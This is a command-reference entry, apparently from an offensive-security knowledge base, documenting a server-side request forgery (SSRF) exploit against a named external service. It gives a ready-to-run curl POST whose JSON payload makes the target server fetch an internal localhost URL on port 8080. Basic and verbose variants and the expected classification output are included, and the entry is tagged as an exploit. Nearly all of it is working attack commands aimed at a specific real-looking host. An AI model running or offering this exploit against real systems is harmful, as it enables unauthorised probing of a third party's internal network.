---
id: cmd-curl-ssrf-internal-001
data: >-
  curl -X POST https://iris.lystit.com/models/default/classification/color -H
  "Content-Type: application/json" -d '{"images":
  ["http://127.0.0.1:8080/static/rest_framework_swagger/images/wordnik_api.86c91314ec1a.png"]}'
tags:
  - ssrf
  - exploit
type: command
output: '{"data":{"color":{"probability":"0.903368339285","id":12,"value":"orange"}}}'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.470Z'
verified: false
validated: true
submitted: true
---
# curl-post-ssrf-internal

## Command

```bash
curl -X POST https://iris.lystit.com/models/default/classification/color -H "Content-Type: application/json" -d '{"images": ["http://127.0.0.1:8080/static/rest_framework_swagger/images/wordnik_api.86c91314ec1a.png"]}'
```

## Description

This command exploits SSRF by posting an internal localhost URL, forcing the server to fetch from 127.0.0.1:8080.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `-H "Content-Type: application/json"` | JSON header | Yes |
| `-d '{...}'` | Payload with internal URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://iris.lystit.com/models/default/classification/color -H "Content-Type: application/json" -d '{"images": ["http://127.0.0.1:8080/static/rest_framework_swagger/images/wordnik_api.86c91314ec1a.png"]}'
```

### Advanced Usage

```bash
curl -X POST -v https://iris.lystit.com/models/default/classification/color -H "Content-Type: application/json" -d '{"images": ["http://127.0.0.1:8080/static/rest_framework_swagger/images/wordnik_api.86c91314ec1a.png"]}'
```

## Expected Output

Classification JSON based on the internal image, e.g., {"data":{"color":{"probability":"0.903368339285","id":12,"value":"orange"}}}.

## Related

- [[Related Procedure: Exploit SSRF with Internal URL in Lyst Iris]]
